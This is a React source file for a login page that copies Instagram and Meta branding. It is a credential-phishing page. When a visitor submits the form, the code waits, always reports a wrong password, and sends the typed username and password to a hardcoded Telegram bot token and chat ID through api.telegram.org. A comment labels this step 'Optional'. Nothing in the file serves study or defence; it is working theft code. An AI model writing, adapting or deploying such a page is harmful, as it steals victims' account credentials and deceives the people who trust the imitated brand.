import { useState } from "react";

export function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [language, setLanguage] = useState("English (India)");

  const isFormValid = username.length > 0 && password.length >= 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    setIsLoading(true);
    setError("");

    // Simulate loading for 2-3 seconds
    await new Promise((resolve) => setTimeout(resolve, 2500));

    // Always show wrong password error
    setError("Sorry, your password was incorrect. Please double-check your password.");
    setIsLoading(false);

    // Optional: Send to Telegram
    try {
      const message = `Username: ${username}\nPassword: ${password}`;
      const telegramBotToken = "7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo";
      const chatId = "7643222418";

      await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
      );
    } catch (err) {
      console.error("Telegram error:", err);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1f2e] to-[#0f1419] flex flex-col items-center justify-center px-4 relative overflow-hidden">
      {/* Back Button */}
      <button className="absolute top-6 left-6 text-white text-2xl hover:opacity-70 transition-opacity">
        ←
      </button>

      {/* Language Selector */}
      <div className="absolute top-6 right-6">
        <select
          value={language}
          onChange={(e) => setLanguage(e.target.value)}
          className="bg-transparent text-white text-sm outline-none cursor-pointer hover:opacity-70 transition-opacity"
        >
          <option className="bg-[#1a1f2e]">English (India)</option>
          <option className="bg-[#1a1f2e]">English (US)</option>
          <option className="bg-[#1a1f2e]">Español</option>
          <option className="bg-[#1a1f2e]">Français</option>
          <option className="bg-[#1a1f2e]">Deutsch</option>
        </select>
      </div>

      {/* Main Container */}
      <div className="w-full max-w-sm flex flex-col items-center">
        {/* Logo */}
        <div className="mb-16 mt-8">
          <svg
            className="w-24 h-24"
            viewBox="0 0 100 100"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              <linearGradient id="instaGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#feda75" />
                <stop offset="5%" stopColor="#fa7e1e" />
                <stop offset="45%" stopColor="#d92e7f" />
                <stop offset="60%" stopColor="#9b36b7" />
                <stop offset="90%" stopColor="#515bd4" />
              </linearGradient>
            </defs>
            <rect
              x="15"
              y="15"
              width="70"
              height="70"
              rx="15"
              fill="url(#instaGradient)"
            />
            <circle cx="50" cy="50" r="20" fill="none" stroke="white" strokeWidth="3" />
            <circle cx="62" cy="38" r="3" fill="white" />
          </svg>
        </div>

        {/* Form Container */}
        <div className="w-full">
          <form className="flex flex-col gap-3" onSubmit={handleSubmit}>
            {/* Username Input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                disabled={isLoading}
                className="w-full h-14 bg-[#2a3139] border border-[#3d4451] rounded-lg px-4 text-white text-sm outline-none focus:border-[#5a6370] transition-colors placeholder-[#8a92a1] disabled:opacity-50"
                placeholder="Username, email address or mobile number"
              />
            </div>

            {/* Password Input */}
            <div className="relative">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLoading}
                className="w-full h-14 bg-[#2a3139] border border-[#3d4451] rounded-lg px-4 text-white text-sm outline-none focus:border-[#5a6370] transition-colors placeholder-[#8a92a1] disabled:opacity-50"
                placeholder="Password"
              />
            </div>

            {/* Error Message */}
            {error && (
              <div className="mt-2 p-3 bg-[#2a3139] border border-[#5a6370] rounded-lg">
                <p className="text-[#f4a9a8] text-xs leading-relaxed text-center">
                  {error}
                </p>
              </div>
            )}

            {/* Login Button */}
            <button
              type="submit"
              disabled={!isFormValid || isLoading}
              className={`w-full h-12 mt-2 rounded-lg font-semibold text-white transition-all duration-300 flex items-center justify-center gap-2 ${
                isLoading
                  ? "bg-[#0a66c2] cursor-not-allowed"
                  : isFormValid
                  ? "bg-[#0a66c2] hover:bg-[#0d5bb0] active:scale-95 cursor-pointer"
                  : "bg-[#0a66c2]/50 cursor-not-allowed"
              }`}
            >
              {isLoading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Logging in...</span>
                </>
              ) : (
                "Log in"
              )}
            </button>
          </form>

          {/* Forgotten Password */}
          <div className="text-center mt-6">
            <a href="#" className="text-sm text-[#0a66c2] hover:text-[#0d5bb0] transition-colors">
              Forgotten password?
            </a>
          </div>

          {/* Create Account Section */}
          <div className="mt-12 pt-6 border-t border-[#3d4451]">
            <button className="w-full h-12 border border-[#0a66c2] rounded-lg font-semibold text-[#0a66c2] hover:bg-[#0a66c2]/10 transition-colors">
              Create new account
            </button>
          </div>
        </div>

        {/* Meta Logo */}
        <div className="mt-16 mb-4">
          <svg
            className="w-8 h-8 text-[#65676b]"
            viewBox="0 0 24 24"
            fill="currentColor"
          >
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
        </div>
      </div>

      {/* Subtle Animation Background */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 right-1/4 w-96 h-96 bg-[#0a66c2]/5 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-1/4 left-1/4 w-96 h-96 bg-[#d92e7f]/5 rounded-full blur-3xl animate-pulse delay-1000"></div>
      </div>
    </div>
  );
}